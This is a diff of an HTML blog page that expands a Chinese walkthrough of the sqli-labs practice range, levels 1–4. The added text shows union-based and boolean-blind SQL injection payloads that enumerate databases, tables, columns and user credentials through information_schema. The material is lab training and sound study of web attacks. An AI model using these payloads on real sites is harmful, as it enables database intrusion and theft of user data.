@@ -10,7 +10,7 @@
 <meta property='og:description' content="因为不想复习数据库所以在玩sqli">
 <meta property='og:url' content='https://Frederick2313072.github.io/p/sqli-labs%E9%80%9A%E5%85%B3/'>
 <meta property='og:site_name' content='Frederick'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-01-05T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-01-05T19:11:03&#43;08:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-01-05T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-01-05T22:01:29&#43;08:00'/>
 <meta name="twitter:title" content="sqli-labs通关">
 <meta name="twitter:description" content="因为不想复习数据库所以在玩sqli">
     </head>
@@ -201,7 +201,41 @@
     </ol>
 </aside>
 
-    
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#less-1">less-1</a></li>
+    <li><a href="#less-2">less-2</a></li>
+    <li><a href="#less-3">less-3</a></li>
+    <li><a href="#less-4">less-4</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
 
             <main class="main full-width">
     <article class="main-article">
@@ -254,7 +288,14 @@
     <section class="article-content">
     
     
-    <p>查找注入点</p>
+    <ul>
+<li>工具：phpstudy，Hackbar</li>
+<li>搭建靶场：sqli-labs(从Github上下载官方的，有些民间的可能会有木马)</li>
+<li>数据库：mysql5.7</li>
+</ul>
+<h1 id="联合注入">联合注入
+</h1><p>需要页面有回显位</p>
+<p>查找注入点</p>
 <p>判断使字符型还是数字型注入id=2-1</p>
 <p>如果是字符型，找到闭合方式，‘，“，’)</p>
 <p>判断查询列数，order by</p>
@@ -281,7 +322,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>报错</p>
-<p>得知less-1共有三列</p>
+<p>得知less-1共有三列，爆出显示位</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -326,6 +367,28 @@
 		data-flex-basis="857px"
 	
 ></p>
+<p>获取数据名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39; union select 1,database(),version() --+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sqli-labs%E9%80%9A%E5%85%B3/image-20250105192920804.png"
+	width="1497"
+	height="336"
+	srcset="/p/sqli-labs%E9%80%9A%E5%85%B3/image-20250105192920804_hu5737477025532059597.png 480w, /p/sqli-labs%E9%80%9A%E5%85%B3/image-20250105192920804_hu7576840691219156242.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="445"
+		data-flex-basis="1069px"
+	
+></p>
+<p>中间省略了一些过程详见less-2</p>
 <p>查询用户名和密码</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -347,7 +410,241 @@
 		data-flex-basis="731px"
 	
 ></p>
-
+<h2 id="less-2">less-2
+</h2><p>判断为数字型，页面改变</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=2-1 ？id=2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>三列</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1 order by 3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>闭合方式为‘</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; order by 3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆数据名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">？id=-1 union select 1,database(),version()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆表名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1 union select 1,2,group_concat(table_name)  from information_schema.tables where table_schema=&#39;security&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆列名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1 union select 1,2,group_concat(column_name)  from information_schema.columns where table_schema=&#39;security&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="less-3">less-3
+</h2><p>与前两关不同的地方是闭合方式</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sqli-labs%E9%80%9A%E5%85%B3/image-20250105200115666.png"
+	width="2547"
+	height="180"
+	srcset="/p/sqli-labs%E9%80%9A%E5%85%B3/image-20250105200115666_hu9482915220980345279.png 480w, /p/sqli-labs%E9%80%9A%E5%85%B3/image-20250105200115666_hu414021853159031108.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1415"
+		data-flex-basis="3396px"
+	
+></p>
+<p>单引号加括号，后续一律以?id=1&rsquo;)开头，和上面同</p>
+<h2 id="less-4">less-4
+</h2><p>判断得知闭合方式双引号加括号</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/?id=2&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sqli-labs%E9%80%9A%E5%85%B3/image-20250105201123859.png"
+	width="2529"
+	height="197"
+	srcset="/p/sqli-labs%E9%80%9A%E5%85%B3/image-20250105201123859_hu11869711227168610598.png 480w, /p/sqli-labs%E9%80%9A%E5%85%B3/image-20250105201123859_hu11155053683851604653.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1283"
+		data-flex-basis="3081px"
+	
+></p>
+<h1 id="布尔盲注">布尔盲注
+</h1><p>页面没有回显，只适用于Mysql，本质就是猜数字游戏，ASCII码判断用二分法，对于字符长度判断可以直接猜大小</p>
+<p>判断得知闭合方式为'</p>
+<ul>
+<li>二分法判断数据库长度</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and length(database())&gt;10--+ //不显示
+</span></span><span class="line"><span class="cl">?id=1&#39; and length(database())&gt;5--+ //正常显示
+</span></span><span class="line"><span class="cl">?id=1&#39; and length(database())&gt;7--+ //正常显示
+</span></span><span class="line"><span class="cl">?id=1&#39; and length(database())&gt;8--+ //不显示
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得知database（）长度为8</p>
+<ul>
+<li>二分法利用ASCII码判断字符</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and ascii(substr(database(),1,1))&gt;100--+ //正常显示
+</span></span><span class="line"><span class="cl">?id=1&#39; and ascii(substr(database(),1,1))&gt;114--+  //正常显示
+</span></span><span class="line"><span class="cl">?id=1&#39; and ascii(substr(database(),1,1))&gt;120--+  //不显示
+</span></span><span class="line"><span class="cl">?id=1&#39; and ascii(substr(database(),1,1))&gt;115--+  //不显示
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得知第一个字符ASCII码为115，即“s”</p>
+<p>依次判断8个字符，知当前数据库为security</p>
+<ul>
+<li>判断当前数据库的表</li>
+</ul>
+<p>判断是否存在admin表</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and exists(select * from admin)--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sqli-labs%E9%80%9A%E5%85%B3/image-20250105210749763.png"
+	width="2275"
+	height="157"
+	srcset="/p/sqli-labs%E9%80%9A%E5%85%B3/image-20250105210749763_hu7017377994840792115.png 480w, /p/sqli-labs%E9%80%9A%E5%85%B3/image-20250105210749763_hu12199216947201215017.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1449"
+		data-flex-basis="3477px"
+	
+></p>
+<ul>
+<li>判断表的个数</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and (select count(table_name)  from information_schema.tables where table_schema=&#39;security&#39;)&gt;4--+ //正常显示
+</span></span><span class="line"><span class="cl">?id=1&#39; and (select count(table_name)  from information_schema.tables where table_schema=&#39;security&#39;)&gt;3--+ //不显示
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>逐一判断表名字符长度</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1))=6--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>逐一判断表名字符的ASCII码</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))&gt;100--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>存在emails,referers,uagents,users</p>
+<ul>
+<li>对column执行相同的操作，where语句修改</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">where table_name = &#39;users&#39; //以及uagents,referers,emails.......一个一个判断，虽然这个过程真的十分漫长
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得知users中有三个字段id,username,password</p>
+<ul>
+<li>判断字段长度</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and length((select id from users limit 3,1))=1--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>判断字段ASCII值</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and ascii(substr((select id from users limit 3,1)),1,1)&gt;100--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
 </section>
 
 
@@ -376,7 +673,7 @@
 
 
         <span>
-            最后更新于 Jan 05, 2025 19:11 &#43;0800
+            最后更新于 Jan 05, 2025 22:01 &#43;0800
         </span>
     </section></footer>
 
